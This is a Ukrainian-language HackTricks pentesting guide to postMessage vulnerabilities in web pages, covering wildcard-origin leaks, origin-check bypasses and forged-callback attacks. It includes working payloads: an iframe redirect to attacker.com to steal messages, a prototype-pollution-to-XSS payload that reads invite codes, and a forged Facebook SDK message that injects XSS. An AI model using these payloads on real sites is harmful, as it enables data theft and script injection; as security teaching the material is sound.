# PostMessage уразливості

{{#include ../../banners/hacktricks-training.md}}

## Надіслати **PostMessage**

**PostMessage** використовує наступну функцію для відправлення повідомлення:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Зверніть увагу, що **targetOrigin** може бути '\*' або URL, наприклад _https://company.com._\
У **другому сценарії**, **повідомлення може бути надіслано лише цьому домену** (навіть якщо origin об'єкта Window відрізняється).\
Якщо використовується **wildcard**, **повідомлення можуть бути надіслані будь-якому домену**, і вони будуть надіслані на origin об'єкта Window.

### Атака на iframe & wildcard в **targetOrigin**

Як пояснено в [**цей звіт**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), якщо ви знайдете сторінку, яку можна **iframed** (немає захисту `X-Frame-Header`) і яка **відправляє чутливі** повідомлення через **postMessage**, використовуючи **wildcard** (\*), ви можете **змінити** **origin** **iframe** і **leak** ці **чутливі** повідомлення на домен, підконтрольний вам.\
Зверніть увагу, що якщо сторінку можна iframed, але **targetOrigin** **встановлено на URL і не на wildcard**, цей **трюк не спрацює**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener експлуатація

**`addEventListener`** — це функція, яку використовує JS для оголошення функції, що **очікує `postMessages`**.\
Код, подібний до наведеного нижче, буде використаний:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Зверніть увагу в цьому випадку, як **перше**, що робить код — це **перевірка origin**. Це надзвичайно **важливо**, особливо якщо сторінка збирається робити **щось чутливе** з отриманою інформацією (наприклад змінювати пароль). **Якщо вона не перевіряє origin, атакуючі можуть змусити жертв відправляти довільні дані на ці endpoints** і змінювати паролі жертв (в цьому прикладі).

### Виявлення

Щоб **знайти event listeners** на поточній сторінці ви можете:

- **Шукати** у JS-коді `window.addEventListener` та `$(window).on` (_JQuery version_)
- **Виконати** у консолі інструментів розробника: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Перейти** в _Elements --> Event Listeners_ в інструментах розробника браузера

![](<../../images/image (396).png>)

- Використати **розширення браузера** як [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) або [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ці розширення **перехоплюватимуть всі повідомлення** і показуватимуть їх вам.

### Обходи перевірки origin

- **`event.isTrusted`** атрибут вважається безпечним, оскільки повертає `True` лише для подій, згенерованих реальними діями користувача. Хоча його важко обійти при коректній реалізації, його значення в перевірках безпеки помітне.
- Використання **`indexOf()`** для валідації origin у PostMessage подіях може бути піддатливим до обходу. Приклад, що ілюструє цю вразливість:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Метод **`search()`** з `String.prototype.search()` призначений для регулярних виразів, а не рядків. Передача чого-небудь, що не є regexp, призводить до неявного перетворення в regex, роблячи метод потенційно небезпечним. Це пов’язано з тим, що в regex крапка (.) діє як wildcard, дозволяючи обходити валідацію за допомогою спеціально сконструйованих доменів. Наприклад:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Функція **`match()`**, подібно до `search()`, обробляє regex. Якщо регулярний вираз неправильно структурований, він може бути схильним до обходу.
- Функція **`escapeHtml`** призначена для очищення вводу шляхом екранізації символів. Однак вона не створює новий екранований об’єкт, а перезаписує властивості існуючого об’єкта. Цю поведінку можна експлуатувати. Зокрема, якщо об’єкт можна змінити так, що його контрольована властивість не має `hasOwnProperty`, `escapeHtml` не виконає очікуваної обробки. Це демонструється в прикладах нижче:

- Очікуваний провал:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Обхід екранізації:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

У контексті цієї вразливості об’єкт `File` особливо експлуатований через його властивість `name`, доступну лише для читання. Ця властивість, коли використовується в шаблонах, не санітизується функцією `escapeHtml`, що призводить до потенційних ризиків безпеки.

- Властивість `document.domain` в JavaScript може бути встановлена скриптом для скорочення домену, дозволяючи більш лояльне застосування same-origin policy в межах того ж батьківського домену.

### Обхід e.origin == window.origin

Коли вбудовуєте веб-сторінку у **sandboxed iframe** використовуючи %%%%%%, важливо розуміти, що origin iframe буде встановлено в null. Це особливо важливо при роботі з **sandbox attributes** та їхнім впливом на безпеку і функціональність.

Вказавши **`allow-popups`** в атрибуті sandbox, будь-яке popup-вікно, відкрите зсередини iframe, успадковує sandbox-обмеження батьківського iframe. Це означає, що якщо не вказано атрибут **`allow-popups-to-escape-sandbox`**, origin popup-вікна також буде встановлено в `null`, відповідно до origin iframe.

Як наслідок, коли popup відкрито в таких умовах і повідомлення надсилається з iframe у popup за допомогою **`postMessage`**, обидві сторони — відправник і отримувач — матимуть origin, встановлені в `null`. Це призводить до того, що **`e.origin == window.origin`** буде дорівнювати true (`null == null`), оскільки і iframe, і popup мають однакове значення origin — `null`.

Для більш детальної інформації **читайте**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Обхід e.source

Можна перевірити, чи повідомлення надійшло з того ж вікна, в якому скрипт слухає (особливо цікаво для **Content Scripts from browser extensions**, щоб перевірити, чи повідомлення було відправлене з тієї ж сторінки):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Ви можете примусово зробити **`e.source`** повідомлення рівним null, створивши **iframe**, який **надсилає** **postMessage** і **негайно видаляється**.

Для детальнішої інформації **читайте:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Щоб виконати ці атаки, бажано мати можливість **розмістити веб-сторінку жертви** всередині `iframe`. Але деякі заголовки, такі як `X-Frame-Header`, можуть **запобігти** цій **поведінці**.\
У таких випадках ви все ще можете використати менш приховану атаку. Ви можете відкрити нову вкладку з вразливим веб-додатком і спілкуватися з ним:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Викрадення повідомлення, відправленого дочірньому iframe, блокуючи головну сторінку

На наступній сторінці показано, як можна викрасти **чутливі postmessage дані**, відправлені **дочірньому iframe**, шляхом **блокування** **головної** сторінки перед відправленням даних та зловживання **XSS у дочірньому iframe**, щоб **leak the data** до їх отримання:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Викрадення повідомлення шляхом зміни location iframe

Якщо ви можете iframe-нути веб-сторінку без X-Frame-Header, яка містить інший iframe, ви можете **змінити location того дочірнього iframe**, тому якщо він отримує **postmessage**, відправлений із використанням **wildcard**, нападник може **змінити** **origin** того iframe на сторінку, **контрольовану** ним, і **викрасти** повідомлення:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage до Prototype Pollution та/або XSS

У сценаріях, коли дані, відправлені через `postMessage`, виконуються JS, ви можете **iframe** сторінку і **exploit** **prototype pollution/XSS**, відправивши експлойт через `postMessage`.

Декілька **дуже добре пояснених XSS через `postMessage`** можна знайти за адресою [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Приклад експлойту для зловживання **Prototype Pollution і потім XSS** через `postMessage` до `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Для **додаткової інформації**:

- Посилання на сторінку про [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Посилання на сторінку про [**XSS**](../xss-cross-site-scripting/index.html)
- Посилання на сторінку про [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Передбачення токенів callback для **`Math.random()`** у postMessage bridges

Коли валідація повідомлення використовує «спільний секрет», згенерований за допомогою `Math.random()` (наприклад, `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) і той самий helper також присвоює імена plugin iframes, ви можете відновити виходи PRNG і підробити довірені повідомлення:

- **Leak PRNG outputs via `window.name`:** SDK автоматично присвоює імена iframe-ам плагінів за допомогою `guid()`. Якщо ви контролюєте верхній фрейм, завантажте сторінку жертви в iframe, потім перенаправте plugin iframe на ваш origin (наприклад, `window.frames[0].frames[0].location='https://attacker.com'`) і зчитайте `window.frames[0].frames[0].name`, щоб отримати сирий вихід `Math.random()`.
- **Force more outputs without reloads:** Деякі SDK відкривають шлях для реініціалізації; у FB SDK відправлення `init:post` з `{xfbml:1}` примушує `XFBML.parse()`, знищує/створює наново plugin iframe і генерує нові імена/ID callback-ів. Повторна реініціалізація дає стільки виходів PRNG, скільки потрібно (зверніть увагу на додаткові внутрішні виклики `Math.random()` для ID callback/iframe, тому потрібно пропускати проміжні значення).
- **Trusted-origin delivery via parameter pollution:** Якщо endpoint першопартійного плагіна відображає ненормалізований параметр у cross-window payload (наприклад, `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), ви можете інжектити `&type=...&iconSVG=...`, зберігаючи довірений origin `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` і подайте кілька значень (навіть не послідовних) у предиктор V8 `Math.random` (наприклад, на базі Z3). Згенеруйте наступний `guid()` локально, щоб підробити очікуваний токен callback.
- **Trigger the sink:** Сформуйте дані postMessage так, щоб бридж викликав `xd.mpn.setupIconIframe` і інжектував HTML у `iconSVG` (наприклад, URL-кодований `<img src=x onerror=...>`), досягаючи DOM XSS всередині hosting origin; звідти можна прочитати same-origin iframes (OAuth діалоги, arbiters тощо).
- **Framing quirks help:** Ланцюжок вимагає фреймінгу. У деяких mobile webviews `X-Frame-Options` може деградувати до невпідтримуваного `ALLOW-FROM`, коли присутній `frame-ancestors`, а параметри “compat” можуть примусити більш ліберальні `frame-ancestors`, що відкриває побічний канал `window.name`.

#### Мінімальний приклад підробленого повідомлення
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Посилання

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Для практики: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
